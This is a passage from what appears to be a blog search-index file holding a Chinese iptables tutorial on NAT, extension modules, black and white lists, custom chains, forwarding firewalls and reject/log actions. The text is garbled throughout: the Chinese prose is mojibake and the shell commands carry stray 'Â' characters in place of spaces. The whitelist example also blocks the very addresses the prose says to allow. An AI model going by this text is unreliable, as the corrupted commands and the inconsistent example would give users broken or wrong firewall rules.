10.1.0.0/16Â -oÂ eth0Â -jÂ MASQUERADE\n```\n\n\n\n### 11.9 DNATå¤–ç½‘è¿›æ¥(natè¡¨preroutingé“¾)\n\n```bash\niptablesÂ -tÂ natÂ -IÂ PREROUTINGÂ -dÂ å…¬ç½‘IPÂ -pÂ tcpÂ --dportÂ å…¬ç½‘ç«¯å£Â -jÂ DNATÂ --to-destinationÂ ç§ç½‘IP:ç«¯å£å·\niptablesÂ -tÂ natÂ -IÂ PREROUTINGÂ -dÂ å…¬ç½‘IPÂ -pÂ tcpÂ --dportÂ 8080Â -jÂ DNATÂ --to-destinationÂ 10.1.0.1:80\n\n# ä½†æ˜¯åœ¨æµ‹è¯•DNATæ—¶ï¼Œå¯¹åº”SNATè§„åˆ™ä¹Ÿéœ€è¦é…ç½®ï¼Œæ‰èƒ½æ­£å¸¸DNATï¼Œå¯ä»¥å…ˆå°è¯•åªé…ç½®DNATè§„åˆ™ï¼Œå¦‚æœæ— æ³•æ­£å¸¸DNATï¼Œå†å°è¯•æ·»åŠ å¯¹åº”çš„SNATè§„åˆ™ï¼ŒSNATè§„åˆ™é…ç½®ä¸€æ¡å³å¯ï¼ŒDNATè§„åˆ™éœ€è¦æ ¹æ®å®é™…æƒ…å†µé…ç½®ä¸åŒçš„DNATè§„åˆ™ã€‚\niptablesÂ -tÂ natÂ -AÂ POSTROUTINGÂ -sÂ 10.1.0.0/16Â -jÂ SNATÂ --to-sourceÂ å…¬ç½‘IP\n```\n\n\n\n### 11.10 æœ¬æœºç›®æ ‡ç«¯å£æ˜ å°„\n\n```bash\niptablesÂ -tÂ natÂ -AÂ PREROUTINGÂ -pÂ tcpÂ --dportÂ 80Â -jÂ REDIRECTÂ --to-portsÂ 8080\n```\n\né…ç½®å®Œæˆä¸Šè¿°è§„åˆ™åï¼Œå…¶ä»–æœºå™¨è®¿é—®æœ¬æœºçš„80ç«¯å£æ—¶ï¼Œä¼šè¢«æ˜ å°„åˆ°8080ç«¯å£ã€‚\n\n\n\n# 12. å‚è€ƒèµ„æ–™\n\n+ http://www.zsythink.net/archives/tag/iptables/\n+ https://support-it.huawei.com/docs/zh-cn/hcs-6.5.0/vfw-type1/vfw_ug_000031.html\n+ https://zhuanlan.zhihu.com/p/86734727\n","tags":["iptables"],"categories":["å‘½ä»¤"]},{"title":"iptablesä½¿ç”¨æ•™ç¨‹02","url":"%2Fp%2F424d5aad.html","content":"\n# 5. å¸¸ç”¨æ‰©å±•\n\n### 5.1 iprangeæ‰©å±•æ¨¡å—\n\nä½¿ç”¨iprangeæ‰©å±•æ¨¡å—å¯ä»¥æŒ‡å®š\"ä¸€æ®µè¿ç»­çš„IPåœ°å€èŒƒå›´\"ï¼Œç”¨äºåŒ¹é…æŠ¥æ–‡çš„æºåœ°å€æˆ–è€…ç›®æ ‡åœ°å€ã€‚\n\n<!-- more -->\n\n```bash\niptablesÂ -tÂ filterÂ -IÂ INPUTÂ -mÂ iprangeÂ --src-rangeÂ 192.168.1.127-192.168.1.146Â -jÂ DROP\niptablesÂ -tÂ filterÂ -IÂ OUTPUTÂ -mÂ iprangeÂ --dst-rangeÂ 192.168.1.127-192.168.1.146Â -jÂ DROP\niptablesÂ -tÂ filterÂ -IÂ INPUTÂ -mÂ iprangeÂ !Â --src-rangeÂ 192.168.1.127-192.168.1.146Â -jÂ DROP\n```\n\n\n\n### 5.2 stringæ‰©å±•æ¨¡å—\n\nä½¿ç”¨stringæ‰©å±•æ¨¡å—ï¼Œå¯ä»¥æŒ‡å®šè¦åŒ¹é…çš„å­—ç¬¦ä¸²ï¼Œå¦‚æœæŠ¥æ–‡ä¸­åŒ…å«å¯¹åº”çš„å­—ç¬¦ä¸²ï¼Œåˆ™ç¬¦åˆåŒ¹é…æ¡ä»¶ã€‚\n\n--algoï¼šç”¨äºæŒ‡å®šåŒ¹é…ç®—æ³•ï¼Œå¯é€‰çš„ç®—æ³•æœ‰bmä¸kmpï¼Œæ­¤é€‰é¡¹ä¸ºå¿…é¡»é€‰é¡¹ï¼Œæˆ‘ä»¬ä¸ç”¨çº ç»“äºé€‰æ‹©å“ªä¸ªç®—æ³•ï¼Œä½†æ˜¯æˆ‘ä»¬å¿…é¡»æŒ‡å®šä¸€ä¸ªã€‚\n\n--stringï¼šç”¨äºæŒ‡å®šéœ€è¦åŒ¹é…çš„å­—ç¬¦ä¸²ã€‚\n\n```bash\niptablesÂ -tÂ filterÂ -IÂ INPUTÂ -pÂ tcpÂ --sportÂ 80Â -mÂ stringÂ --algoÂ bmÂ --stringÂ \"OOXX\"Â -jÂ REJECT\n```\n\n\n\n### 5.3 timeæ‰©å±•æ¨¡å—\n\næˆ‘ä»¬å¯ä»¥é€šè¿‡timeæ‰©å±•æ¨¡å—ï¼Œæ ¹æ®æ—¶é—´æ®µåŒºåŒ¹é…æŠ¥æ–‡ï¼Œå¦‚æœæŠ¥æ–‡åˆ°è¾¾çš„æ—¶é—´åœ¨æŒ‡å®šçš„æ—¶é—´èŒƒå›´ä»¥å†…ï¼Œåˆ™ç¬¦åˆåŒ¹é…æ¡ä»¶ã€‚\n\n--timestartï¼šç”¨äºæŒ‡å®šæ—¶é—´èŒƒå›´çš„å¼€å§‹æ—¶é—´ï¼Œä¸å¯å–å\n\n--timestopï¼šç”¨äºæŒ‡å®šæ—¶é—´èŒƒå›´çš„ç»“æŸæ—¶é—´ï¼Œä¸å¯å–å\n\n--weekdaysï¼šç”¨äºæŒ‡å®š\"æ˜ŸæœŸå‡ \"ï¼Œå¯å–å\n\n--monthdaysï¼šç”¨äºæŒ‡å®š\"å‡ å·\"ï¼Œå¯å–å\n\n--datestartï¼šç”¨äºæŒ‡å®šæ—¥æœŸèŒƒå›´çš„å¼€å§‹æ—¥æœŸï¼Œä¸å¯å–å\n\n--datestopï¼šç”¨äºæŒ‡å®šæ—¥æœŸèŒƒå›´çš„ç»“æŸæ—¶é—´ï¼Œä¸å¯å–å\n\n```bash\niptablesÂ -tÂ filterÂ -IÂ OUTPUTÂ -pÂ tcpÂ --dportÂ 80Â -mÂ timeÂ --timestartÂ 09:00:00Â --timestopÂ 19:00:00Â -jÂ REJECT\niptablesÂ -tÂ filterÂ -IÂ OUTPUTÂ -pÂ tcpÂ --dportÂ 443Â -mÂ timeÂ --timestartÂ 09:00:00Â --timestopÂ 19:00:00Â -jÂ REJECT\niptablesÂ -tÂ filterÂ -IÂ OUTPUTÂ -pÂ tcpÂ --dportÂ 80Â Â -mÂ timeÂ --weekdaysÂ 6,7Â -jÂ REJECT\niptablesÂ -tÂ filterÂ -IÂ OUTPUTÂ -pÂ tcpÂ --dportÂ 80Â Â -mÂ timeÂ --monthdaysÂ 22,23Â -jÂ REJECT\niptablesÂ -tÂ filterÂ -IÂ OUTPUTÂ -pÂ tcpÂ --dportÂ 80Â Â -mÂ timeÂ !Â --monthdaysÂ 22,23Â -jÂ REJECT\niptablesÂ -tÂ filterÂ -IÂ OUTPUTÂ -pÂ tcpÂ --dportÂ 80Â Â -mÂ timeÂ --timestartÂ 09:00:00Â --timestopÂ 18:00:00Â --weekdaysÂ 6,7Â -jÂ REJECT\niptablesÂ -tÂ filterÂ -IÂ OUTPUTÂ -pÂ tcpÂ --dportÂ 80Â Â -mÂ timeÂ --weekdaysÂ 5Â --monthdaysÂ 22,23,24,25,26,27,28Â -jÂ REJECT\niptablesÂ -tÂ filterÂ -IÂ OUTPUTÂ -pÂ tcpÂ --dportÂ 80Â Â -mÂ timeÂ --datestartÂ 2017-12-24Â --datestopÂ 2017-12-27Â -jÂ REJECT\n```\n\n\n\n### 5.4 connlimitæ‰©å±•æ¨¡å—\n\nä½¿ç”¨connlimitæ‰©å±•æ¨¡å—ï¼Œå¯ä»¥é™åˆ¶æ¯ä¸ªIPåœ°å€åŒæ—¶é“¾æ¥åˆ°serverç«¯çš„é“¾æ¥æ•°é‡ï¼Œæ³¨æ„ï¼šæˆ‘ä»¬ä¸ç”¨æŒ‡å®šIPï¼Œå…¶é»˜è®¤å°±æ˜¯é’ˆå¯¹\"æ¯ä¸ªå®¢æˆ·ç«¯IP\"ï¼Œå³å¯¹å•IPçš„å¹¶å‘è¿æ¥æ•°é™åˆ¶ã€‚\n\n--connlimit-aboveï¼šå•ç‹¬ä½¿ç”¨æ­¤é€‰é¡¹æ—¶ï¼Œè¡¨ç¤ºé™åˆ¶æ¯ä¸ªIPçš„é“¾æ¥æ•°é‡ã€‚\n\n--connlimit-maskï¼šæ­¤é€‰é¡¹ä¸èƒ½å•ç‹¬ä½¿ç”¨ï¼Œåœ¨ä½¿ç”¨--connlimit-aboveé€‰é¡¹æ—¶ï¼Œé…åˆæ­¤é€‰é¡¹ï¼Œåˆ™å¯ä»¥é’ˆå¯¹\"æŸç±»IPæ®µå†…çš„ä¸€å®šæ•°é‡çš„IP\"è¿›è¡Œè¿æ¥æ•°é‡çš„é™åˆ¶\n\n```bash\niptablesÂ -IÂ INPUTÂ -pÂ tcpÂ --dportÂ 22Â -mÂ connlimitÂ --connlimit-aboveÂ 2Â -jÂ REJECT\niptablesÂ -IÂ INPUTÂ -pÂ tcpÂ --dportÂ 22Â -mÂ connlimitÂ --connlimit-aboveÂ 20Â --connlimit-maskÂ 24Â -jÂ REJECT\niptablesÂ -IÂ INPUTÂ -pÂ tcpÂ --dportÂ 22Â -mÂ connlimitÂ --connlimit-aboveÂ 10Â --connlimit-maskÂ 27Â -jÂ REJECT\n```\n\n\n\n### 5.5 limitæ‰©å±•æ¨¡å—\n\nlimitæ¨¡å—æ˜¯å¯¹\"æŠ¥æ–‡åˆ°è¾¾é€Ÿç‡\"è¿›è¡Œé™åˆ¶çš„ã€‚å¦‚æœæˆ‘æƒ³è¦é™åˆ¶å•ä½æ—¶é—´å†…æµå…¥çš„åŒ…çš„æ•°é‡ï¼Œå°±èƒ½ç”¨limitæ¨¡å—ã€‚\n\n--limit-burstï¼šç±»æ¯”\"ä»¤ç‰Œæ¡¶\"ç®—æ³•ï¼Œæ­¤é€‰é¡¹ç”¨äºæŒ‡å®šä»¤ç‰Œæ¡¶ä¸­ä»¤ç‰Œçš„æœ€å¤§æ•°é‡ã€‚\n\n--limitï¼šç±»æ¯”\"ä»¤ç‰Œæ¡¶\"ç®—æ³•ï¼Œæ­¤é€‰é¡¹ç”¨äºæŒ‡å®šä»¤ç‰Œæ¡¶ä¸­ç”Ÿæˆæ–°ä»¤ç‰Œçš„é¢‘ç‡ï¼Œå¯ç”¨æ—¶é—´å•ä½æœ‰secondã€minute ã€hourã€dayã€‚\n\n```bash\n#å¦‚ä¸‹ä¸¤æ¡è§„åˆ™éœ€é…åˆä½¿ç”¨\niptablesÂ -tÂ filterÂ -IÂ INPUTÂ -pÂ icmpÂ -mÂ limitÂ --limit-burstÂ 3Â --limitÂ 10/minuteÂ -jÂ ACCEPT\niptablesÂ -tÂ filterÂ -AÂ INPUTÂ -pÂ icmpÂ -jÂ REJECT\n```\n\n\n\n### 5.6 udpæ‰©å±•\n\nudpæ‰©å±•æ¨¡å—èƒ½ç”¨çš„åŒ¹é…æ¡ä»¶æ¯”è¾ƒå°‘ï¼Œåªæœ‰ä¸¤ä¸ªï¼Œå°±æ˜¯--sportä¸--dportï¼Œå³åŒ¹é…æŠ¥æ–‡çš„æºç«¯å£ä¸ç›®æ ‡ç«¯å£ã€‚\n\n```bash\niptablesÂ -tÂ filterÂ -IÂ INPUTÂ -pÂ udpÂ -mÂ udpÂ --dportÂ 137Â -jÂ ACCEPT\niptablesÂ -tÂ filterÂ -IÂ INPUTÂ -pÂ udpÂ -mÂ udpÂ --dportÂ 137:157Â -jÂ ACCEPT\n#å¯ä»¥ç»“åˆmultiportæ¨¡å—æŒ‡å®šå¤šä¸ªç¦»æ•£çš„ç«¯å£\n```\n\n\n\n### 5.7 icmpæ‰©å±•\n\nICMPåè®®çš„å…¨ç§°ä¸ºInternet Control Message Protocolï¼Œç¿»è¯‘ä¸ºäº’è”ç½‘æ§åˆ¶æŠ¥æ–‡åè®®ï¼Œå®ƒä¸»è¦ç”¨äºæ¢æµ‹ç½‘ç»œä¸Šçš„ä¸»æœºæ˜¯å¦å¯ç”¨ï¼Œç›®æ ‡æ˜¯å¦å¯è¾¾ï¼Œç½‘ç»œæ˜¯å¦é€šç•…ï¼Œè·¯ç”±æ˜¯å¦å¯ç”¨ç­‰ã€‚\n\npingå‘½ä»¤ä½¿ç”¨çš„å°±æ˜¯icmpåè®®ã€‚\n\n--icmp-typeï¼šåŒ¹é…icmpæŠ¥æ–‡çš„å…·ä½“ç±»å‹\n\n```bash\niptablesÂ -tÂ filterÂ -IÂ INPUTÂ -pÂ icmpÂ -mÂ icmpÂ --icmp-typeÂ 8/0Â -jÂ REJECT\niptablesÂ -tÂ filterÂ -IÂ INPUTÂ -pÂ icmpÂ --icmp-typeÂ 8Â -jÂ REJECT\niptablesÂ -tÂ filterÂ -IÂ OUTPUTÂ -pÂ icmpÂ -mÂ icmpÂ --icmp-typeÂ 0/0Â -jÂ REJECT\niptablesÂ -tÂ filterÂ -IÂ OUTPUTÂ -pÂ icmpÂ --icmp-typeÂ 0Â -jÂ REJECT\niptablesÂ -tÂ filterÂ -IÂ INPUTÂ -pÂ icmpÂ --icmp-typeÂ \"echo-request\"Â -jÂ REJECT\n```\n\n\n\n### 5.8 stateæ‰©å±•\n\næˆ‘ä»¬ä¸ºäº†è®©\"æä¾›æœåŠ¡æ–¹\"èƒ½å¤Ÿæ­£å¸¸çš„\"å“åº”\"æˆ‘ä»¬çš„è¯·æ±‚ï¼Œäºæ˜¯åœ¨ä¸»æœºä¸Šå¼€æ”¾äº†å¯¹åº”çš„ç«¯å£(80, 22)ï¼Œå¼€æ”¾è¿™äº›ç«¯å£çš„åŒæ—¶ï¼Œä¹Ÿå‡ºç°äº†é—®é¢˜ï¼Œåˆ«äººåˆ©ç”¨è¿™äº›å¼€æ”¾çš„ç«¯å£ï¼Œ\"ä¸»åŠ¨\"çš„æ”»å‡»æˆ‘ä»¬ï¼Œä»–ä»¬å‘é€è¿‡æ¥çš„æŠ¥æ–‡å¹¶ä¸æ˜¯ä¸ºäº†å“åº”æˆ‘ä»¬ï¼Œè€Œæ˜¯ä¸ºäº†ä¸»åŠ¨æ”»å‡»æˆ‘ä»¬ã€‚\n\nå¯¹äºstateæ¨¡å—çš„è¿æ¥è€Œè¨€ï¼Œ\"è¿æ¥\"å…¶ä¸­çš„æŠ¥æ–‡å¯ä»¥åˆ†ä¸º5ç§çŠ¶æ€ï¼ŒæŠ¥æ–‡çŠ¶æ€å¯ä»¥ä¸ºNEWã€ESTABLISHEDã€RELATEDã€INVALIDã€UNTRACKEDã€‚\n\n\n\n+ æ€æ ·åˆ¤æ–­æŠ¥æ–‡æ˜¯å¦æ˜¯ä¸ºäº†å›åº”ä¹‹å‰å‘å‡ºçš„æŠ¥æ–‡?\n\næˆ‘ä»¬åªè¦æ”¾è¡ŒçŠ¶æ€ä¸ºESTABLISHEDçš„æŠ¥æ–‡å³å¯ï¼Œå› ä¸ºå¦‚æœæŠ¥æ–‡çš„çŠ¶æ€ä¸ºESTABLISHEDï¼Œé‚£ä¹ˆæŠ¥æ–‡è‚¯å®šæ˜¯ä¹‹å‰å‘å‡ºçš„æŠ¥æ–‡çš„å›åº”ï¼Œå¦‚æœä½ è¿˜ä¸æ”¾å¿ƒï¼Œå¯ä»¥å°†çŠ¶æ€ä¸ºRELATEDæˆ–ESTABLISHEDçš„æŠ¥æ–‡éƒ½æ”¾è¡Œï¼Œè¿™æ ·ï¼Œå°±è¡¨ç¤ºåªæœ‰å›åº”æˆ‘ä»¬çš„æŠ¥æ–‡èƒ½å¤Ÿé€šè¿‡é˜²ç«å¢™ï¼Œå¦‚æœæ˜¯åˆ«äººä¸»åŠ¨å‘é€è¿‡æ¥çš„æ–°çš„æŠ¥æ–‡ï¼Œåˆ™æ— æ³•é€šè¿‡é˜²ç«å¢™ã€‚\n\n\n\n# 6. é»‘ç™½åå•\n\nå½“é“¾çš„é»˜è®¤ç­–ç•¥è®¾ç½®ä¸ºACCEPTæ—¶ï¼Œå¦‚æœå¯¹åº”çš„é“¾ä¸­æ²¡æœ‰é…ç½®ä»»ä½•è§„åˆ™ï¼Œå°±è¡¨ç¤ºæ¥å—æ‰€æœ‰çš„æŠ¥æ–‡ï¼Œå¦‚æœå¯¹åº”çš„é“¾ä¸­å­˜åœ¨è§„åˆ™ï¼Œä½†æ˜¯è¿™äº›è§„åˆ™æ²¡æœ‰åŒ¹é…åˆ°æŠ¥æ–‡ï¼ŒæŠ¥æ–‡è¿˜æ˜¯ä¼šè¢«æ¥å—ã€‚\n\né“¾çš„é»˜è®¤ç­–ç•¥ä¸ºACCEPTæ—¶ï¼Œé“¾ä¸­çš„è§„åˆ™å¯¹åº”çš„åŠ¨ä½œåº”è¯¥ä¸ºDROPæˆ–è€…REJECTï¼Œè¡¨ç¤ºåªæœ‰åŒ¹é…åˆ°è§„åˆ™çš„æŠ¥æ–‡æ‰ä¼šè¢«æ‹’ç»ï¼Œæ²¡æœ‰è¢«è§„åˆ™åŒ¹é…åˆ°çš„æŠ¥æ–‡éƒ½ä¼šè¢«é»˜è®¤æ¥å—ï¼Œè¿™å°±æ˜¯\"é»‘åå•\"æœºåˆ¶ã€‚\n\n\n\nå½“é“¾çš„é»˜è®¤ç­–ç•¥è®¾ç½®ä¸ºDROPæ—¶ï¼Œå¦‚æœå¯¹åº”çš„é“¾ä¸­æ²¡æœ‰é…ç½®ä»»ä½•è§„åˆ™ï¼Œå°±è¡¨ç¤ºæ‹’ç»æ‰€æœ‰æŠ¥æ–‡ï¼Œå¦‚æœå¯¹åº”çš„é“¾ä¸­å­˜åœ¨è§„åˆ™ï¼Œä½†æ˜¯è¿™äº›è§„åˆ™æ²¡æœ‰åŒ¹é…åˆ°æŠ¥æ–‡ï¼ŒæŠ¥æ–‡è¿˜æ˜¯ä¼šè¢«æ‹’ç»ã€‚\n\nå½“é“¾çš„é»˜è®¤ç­–ç•¥è®¾ç½®ä¸ºDROPæ—¶ï¼Œé“¾ä¸­çš„è§„åˆ™å¯¹åº”çš„åŠ¨ä½œåº”è¯¥ä¸ºACCEPTï¼Œè¡¨ç¤ºåªæœ‰åŒ¹é…åˆ°è§„åˆ™çš„æŠ¥æ–‡æ‰ä¼šè¢«æ”¾è¡Œï¼Œæ²¡æœ‰è¢«è§„åˆ™åŒ¹é…åˆ°çš„æŠ¥æ–‡éƒ½ä¼šè¢«é»˜è®¤æ‹’ç»ï¼Œè¿™å°±æ˜¯\"ç™½åå•\"æœºåˆ¶ã€‚\n\n### 6.1 é»˜è®¤DROPçš„é—®é¢˜\n\nåœ¨å¯¹åº”çš„é“¾ä¸­æ²¡æœ‰è®¾ç½®ä»»ä½•è§„åˆ™æ—¶ï¼Œè¿™æ ·ä½¿ç”¨é»˜è®¤ç­–ç•¥ä¸ºDROPæ˜¯éå¸¸ä¸æ˜æ™ºçš„ï¼Œå› ä¸ºç®¡ç†å‘˜ä¹Ÿä¼šæŠŠè‡ªå·±æ‹’ä¹‹é—¨å¤–ï¼Œå³ä½¿å¯¹åº”çš„é“¾ä¸­å­˜åœ¨æ”¾è¡Œè§„åˆ™ï¼Œå½“æˆ‘ä»¬ä¸å°å¿ƒä½¿ç”¨\"iptables -F\"æ¸…ç©ºè§„åˆ™æ—¶ï¼Œæ”¾è¡Œè§„åˆ™è¢«åˆ é™¤ï¼Œåˆ™æ‰€æœ‰æ•°æ®åŒ…éƒ½æ— æ³•è¿›å…¥ï¼Œè¿™ä¸ªæ—¶å€™å°±ç›¸å½“äºç»™ç®¡ç†å‘˜æŒ–äº†ä¸ªå‘ï¼Œæ‰€ä»¥ï¼Œæˆ‘ä»¬å¦‚æœæƒ³è¦ä½¿ç”¨\"ç™½åå•\"çš„æœºåˆ¶ï¼Œæœ€å¥½å°†é“¾çš„é»˜è®¤ç­–ç•¥ä¿æŒä¸º\"ACCEPT\"ï¼Œç„¶åå°†\"æ‹’ç»æ‰€æœ‰è¯·æ±‚\"è¿™æ¡è§„åˆ™æ”¾åœ¨é“¾çš„å°¾éƒ¨ï¼Œå°†\"æ”¾è¡Œè§„åˆ™\"æ”¾åœ¨å‰é¢ï¼Œè¿™æ ·åšï¼Œæ—¢èƒ½å®ç°\"ç™½åå•\"æœºåˆ¶ï¼Œåˆèƒ½ä¿è¯åœ¨è§„åˆ™è¢«æ¸…ç©ºæ—¶ï¼Œç®¡ç†å‘˜è¿˜æœ‰æœºä¼šè¿æ¥åˆ°ä¸»æœºï¼Œç¤ºä¾‹å¦‚ä¸‹ã€‚\n\n```bash\niptables -I INPUT -s 192.168.1.111,192.168.1.118 -j DROP\niptables -A INPUT -j DROP\n```\n\n\n\n# 7. è‡ªå®šä¹‰é“¾\n\nå½“é»˜è®¤é“¾ä¸­çš„è§„åˆ™éå¸¸å¤šæ—¶ï¼Œä¸æ–¹ä¾¿æˆ‘ä»¬ç®¡ç†ã€‚\n\n### 7.1 æ–°å»º\n\n```bash\niptables -N IN_WEB\n\niptables -nvL\nChain IN_WEB (0 references)\n pkts bytes target     prot opt in     out     source               destination\n```\n\n\n\n### 7.2 æ·»åŠ è§„åˆ™\n\n```bash\niptables -I IN_WEB -s 1.1.1.2 -j REJECT\n\n\niptables -nvL IN_WEB\nChain IN_WEB (0 references)\n pkts bytes target     prot opt in     out     source               destination\n    0     0 REJECT     all  --  *      *       1.1.1.2              0.0.0.0/0            reject-with icmp-port-unreachable\n```\n\n\n\n### 7.3 å¢åŠ å¼•ç”¨\n\nç°åœ¨ï¼Œè‡ªå®šä¹‰é“¾ä¸­å·²ç»æœ‰äº†ä¸€äº›è§„åˆ™ï¼Œä½†æ˜¯ç›®å‰ï¼Œè¿™äº›è§„åˆ™æ— æ³•åŒ¹é…åˆ°ä»»ä½•æŠ¥æ–‡ï¼Œå› ä¸ºæˆ‘ä»¬å¹¶æ²¡æœ‰åœ¨ä»»ä½•é»˜è®¤é“¾ä¸­å¼•ç”¨å®ƒã€‚\n\n\n```bash\niptables -I INPUT -p tcp -j IN_WEB\n\n\niptables -nvL INPUT\nChain INPUT (policy ACCEPT 7813 packets, 5921K bytes)\n pkts bytes target     prot opt in     out     source               destination\n 7614 5907K IN_WEB     tcp  --  *      *       0.0.0.0/0            0.0.0.0/0\n```\n\nä¹‹å‰çš„ç¤ºä¾‹ä¸­ï¼Œæˆ‘ä»¬ä½¿ç”¨\"-j\"é€‰é¡¹æŒ‡å®šåŠ¨ä½œï¼Œè€Œæ­¤å¤„ï¼Œæˆ‘ä»¬å°†\"åŠ¨ä½œ\"æ›¿æ¢ä¸ºäº†\"è‡ªå®šä¹‰é“¾\"\n\n\n\n### 7.4 ä¿®æ”¹\n\n```bash\niptables -E IN_WEB WEB\n```\n\n\n\n### 7.5 åˆ é™¤\n\n```bash\niptables -X WEB\n#iptables: Too many links.\n```\n\nå› ä¸ºæœ‰å¼•ç”¨, æ— æ³•åˆ é™¤\n\n```bash\niptables -D  INPUT 1\niptables -X WEB\n# iptables: Directory not empty.\n```\n\nå› ä¸ºæœ‰è§„åˆ™, æ— æ³•åˆ é™¤\n\n```bash\niptables -F WEB\niptables -X WEB\n\n# åˆ é™¤æˆåŠŸ\n```\n\n\n\n# 8. ç½‘ç»œé˜²ç«å¢™(filterè¡¨forwardé“¾)\n\nç½‘ç»œé˜²ç«å¢™çš„èŒè´£å°±æ˜¯\"è¿‡æ»¤å¹¶è½¬å‘\"ï¼Œè¦æƒ³\"è¿‡æ»¤\"ï¼Œåªèƒ½åœ¨INPUTã€OUTPUTã€FORWARDä¸‰æ¡é“¾ä¸­å®ç°ï¼Œè¦æƒ³\"è½¬å‘\"ï¼ŒæŠ¥æ–‡åˆ™åªä¼šç»è¿‡FORWARDé“¾ï¼ˆå‘å¾€æœ¬æœºçš„æŠ¥æ–‡æ‰ä¼šç»è¿‡INPUTé“¾ï¼‰\n\n![1](iptablesä½¿ç”¨æ•™ç¨‹02/2.png)\n\niptablesçš„è§’è‰²å˜ä¸º\"ç½‘ç»œé˜²ç«å¢™\"æ—¶ï¼Œè§„åˆ™åªèƒ½å®šä¹‰åœ¨FORWARDé“¾ä¸­ã€‚\n\n\n\n### 8.1 ç”¨ä¾‹\n\n![1](iptablesä½¿ç”¨æ•™ç¨‹02/3.png)\n\nä¸Šå›¾ä¸­çš„ä¸»æœºAå……å½“äº†\"å¤–éƒ¨ç½‘ç»œä¸»æœº\"çš„è§’è‰²ï¼ŒAä¸»æœºçš„IPåœ°å€ä¸º192.168.1.147ï¼Œæˆ‘ä»¬ä½¿ç”¨ä¸»æœºAè®¿é—®å†…éƒ¨ç½‘ç»œä¸­çš„ä¸»æœºCï¼Œä½†æ˜¯éœ€è¦ä¸»æœºBè¿›è¡Œè½¬å‘ï¼Œä¸»æœºBåœ¨è½¬å‘æŠ¥æ–‡æ—¶ä¼šè¿›è¡Œè¿‡æ»¤ï¼Œä»¥å®ç°ç½‘ç»œé˜²ç«å¢™çš„åŠŸèƒ½ã€‚\n\n\n\n### 8.2 é…ç½®\n\nè¦é…ç½®è½¬å‘ï¼Œåˆ™éœ€åœ¨FORWAEDé“¾ä¸­å®šä¹‰è§„åˆ™ï¼Œæ‰€ä»¥ï¼Œæˆ‘ä»¬åº”è¯¥åœ¨filterè¡¨ä¸­çš„FORWARDé“¾ä¸­é…ç½®è§„åˆ™ã€‚\n\n```bash\niptables -nvL FORWARD\nChain FORWARD (policy ACCEPT 0 packets, 0 bytes)\n pkts bytes target     prot opt in     out     source               destination\n \n \n# æ·»åŠ é»˜è®¤æ‹’ç» \niptables -A FORWARD -j REJECT\n\n\n# æ·»åŠ è½¬å‘è§„åˆ™\niptables -I FORWARD -s 1.1.0.0/16 -p tcp -m tcp --dport 80 -j ACCEPT\niptables -I FORWARD -d 1.1.0.0/16 -p tcp -m tcp --sport 80 -j ACCEPT\n\n\niptables -nvL FORWARD\nChain FORWARD (policy ACCEPT 0 packets, 0 bytes)\n pkts bytes target     prot opt in     out     source               destination\n    0     0 ACCEPT     tcp  --  *      *       0.0.0.0/0            1.1.0.0/16           tcp spt:80\n    0     0 ACCEPT     tcp  --  *      *       1.1.0.0/16           0.0.0.0/0            tcp dpt:80\n    0     0 REJECT     all  --  *      *       0.0.0.0/0            0.0.0.0/0            reject-with icmp-port-unreachable\n```\n\n\n\nå½“iptablesä½œä¸º\"ç½‘ç»œé˜²ç«å¢™\"æ—¶ï¼Œåœ¨é…ç½®è§„åˆ™æ—¶ï¼Œå¾€å¾€éœ€è¦è€ƒè™‘\"åŒå‘æ€§\"ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œæˆ‘ä»¬ä¸ºäº†è¾¾æˆä¸€ä¸ªç›®çš„ï¼Œå¾€å¾€éœ€è¦ä¸¤æ¡è§„åˆ™æ‰èƒ½å®Œæˆã€‚æ¯æ¬¡é…ç½®è§„åˆ™æ—¶éƒ½è¦è€ƒè™‘\"åŒå‘\"çš„é—®é¢˜, å¯ä»¥è€ƒè™‘åŠ ä¸‹é¢çš„è§„åˆ™, ä»¥ååªåŠ å•å‘å°±å¯ä»¥äº†ã€‚\n\n```bash\niptablesÂ -IÂ FORWARDÂ -mÂ stateÂ --stateÂ ESTABLISHED,RELATEDÂ -jÂ ACCEPT\n```\n\n\n\n# 9. åŠ¨ä½œ\n\nä¹‹å‰ç”¨åˆ°çš„ACCEPTä¸DROPéƒ½å±äºåŸºç¡€åŠ¨ä½œã€‚ä½¿ç”¨-jå¯ä»¥æŒ‡å®šåŠ¨ä½œï¼Œæ¯”å¦‚-j ACCEPT, -j DROP, -j REJECT\n\n### 9.1 REJECT\n\nREJECTåŠ¨ä½œçš„å¸¸ç”¨é€‰é¡¹ä¸º--reject-with\n\nä½¿ç”¨--reject-withé€‰é¡¹ï¼Œå¯ä»¥è®¾ç½®æç¤ºä¿¡æ¯ï¼Œå½“å¯¹æ–¹è¢«æ‹’ç»æ—¶ï¼Œä¼šæç¤ºå¯¹æ–¹ä¸ºä»€ä¹ˆè¢«æ‹’ç»ã€‚\n\nå¯ç”¨å€¼å¦‚ä¸‹\n\nicmp-net-unreachable\n\nicmp-host-unreachable\n\nicmp-port-unreachable,\n\nicmp-proto-unreachable\n\nicmp-net-prohibited\n\nicmp-host-pro-hibited\n\nicmp-admin-prohibited\n\nå½“ä¸è®¾ç½®ä»»ä½•å€¼æ—¶ï¼Œé»˜è®¤å€¼ä¸ºicmp-port-unreachableã€‚\n\n### 9.2 LOG\n\nä½¿ç”¨LOGåŠ¨ä½œï¼Œå¯ä»¥å°†ç¬¦åˆæ¡ä»¶çš„æŠ¥æ–‡çš„ç›¸å…³ä¿¡æ¯è®°å½•åˆ°æ—¥å¿—ä¸­ï¼Œä½†å½“å‰æŠ¥æ–‡å…·ä½“æ˜¯è¢«\"æ¥å—\"ï¼Œè¿˜æ˜¯è¢«\"æ‹’ç»\"ï¼Œéƒ½ç”±åé¢çš„è§„åˆ™æ§åˆ¶ï¼Œæ¢å¥è¯è¯´ï¼ŒLOGåŠ¨ä½œåªè´Ÿè´£è®°å½•åŒ¹é…åˆ°çš„æŠ¥æ–‡çš„ç›¸å…³ä¿¡æ¯ï¼Œä¸è´Ÿè´£å¯¹æŠ¥æ–‡çš„å…¶ä»–å¤„ç†ï¼Œå¦‚æœæƒ³è¦å¯¹æŠ¥æ–‡è¿›è¡Œè¿›ä¸€æ­¥çš„å¤„ç†ï¼Œå¯ä»¥åœ¨ä¹‹åè®¾ç½®å…·ä½“è§„åˆ™ï¼Œè¿›è¡Œè¿›ä¸€æ­¥çš„å¤„ç†ã€‚\n\n\n\n### 9.3 SNAT(NATè¡¨)\n\n##### 9.3.1 